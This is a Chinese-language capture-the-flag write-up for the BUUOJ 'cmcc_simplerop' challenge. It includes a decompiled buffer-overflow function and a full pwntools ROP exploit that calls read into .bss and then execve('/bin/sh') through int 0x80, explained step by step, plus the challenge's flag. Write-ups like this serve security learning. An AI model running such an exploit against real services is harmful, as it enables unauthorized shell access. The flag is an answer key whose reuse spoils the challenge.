# cmcc_simplerop

[题目地址](https://buuoj.cn/challenges#cmcc_simplerop)

看起来rop非常简单，实际上每次都能从rop中学到之前没注意的东西。

ghidra分析了好一会才出来。要么就是这道题代码量上天，要么就是程序静态包含了libc。此题明显是后者，可以直接找到main。

```c
void main(void)

{
  undefined local_24 [32];
  
  puts("ROP is easy is\'nt it ?");
  printf("Your input :");
  fflush((FILE *)stdout);
  read(0,local_24,100);
  return;
}
```

本来想ROPgadget自动生成payload的，实际测试也可以，但是长度超了。好吧只能自己写了。基础薄弱，写了半天出不来，找个[wp](https://blog.csdn.net/A951860555/article/details/115286266)看看。rop确实没什么好讲的了，但是此题有些细节需要注意。

```python
from pwn import *
p=remote("node4.buuoj.cn",26913)
read_addr=0x0806cd50
bss=0x080eb584
edx_ecx_ebx=0x0806e850
int_0x80=0x080493e1
eax=0x080bae06
main=0x08048e24
payload=b'a'*0x20+p32(read_addr)+p32(edx_ecx_ebx)+p32(0)+p32(bss)+p32(8)+p32(eax)+p32(0xb)+p32(edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)+p32(int_0x80)
p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()
```

乍一看有点吓人，这么长？仔细一看不过如此。前面的a就是填充，注意此题无论ida还是ghidra看到的偏移量都不对，需要自己用gdb或者其他的动态调试得到真正的偏移0x20。接着返回到read函数地址，p32(0)+p32(bss)+p32(8)都是参数，从stdin读入8个字节到我们选好的bss段。问题是为什么要把返回地址填为p32(edx_ecx_ebx)呢？结合一些ret2libc的题，我们一般是放main地址，泄露完地址就行了。可是这道题不一样，read执行完才解决/bin/sh的问题（程序内没有现成的/bin/sh)，剩下的呢？如果说填pop_eax的地址，确实能返回到pop_eax这个gadget，但是仔细瞧瞧，pop进去的是啥？是read的第一个参数0！因为这时esp指着read的第一个参数。

我们需要让栈平衡，说人话就是让esp重新指向我们需要的下一步指令。刚才传参用的p32(0)+p32(bss)+p32(8)遗留在了栈上，正好用p32(edx_ecx_ebx)清理掉。p32(edx_ecx_ebx)这个gadget的内容不是重点，重点是需要3个pop清理栈内容，任何包含3个pop及ret的gadget都行。清理完成后esp重新指向p32(eax)，放进去0xb作为execve的系统调用号，涉及到[32位的系统调用](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)：

- Linux 32位的系统调用是通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。

照着传就行了。后面的rop链就很简单了，没有涉及栈平衡，因为全都是pop gadget。发送payload再补充read的/bin/sh\x00，\x00为了与其他bss上的内容区分开，防止到时候getshell时把其他的字符串带进去。

## Flag
> flag{df152b7f-fbe3-4ccd-9c3f-8c570db8ad7d}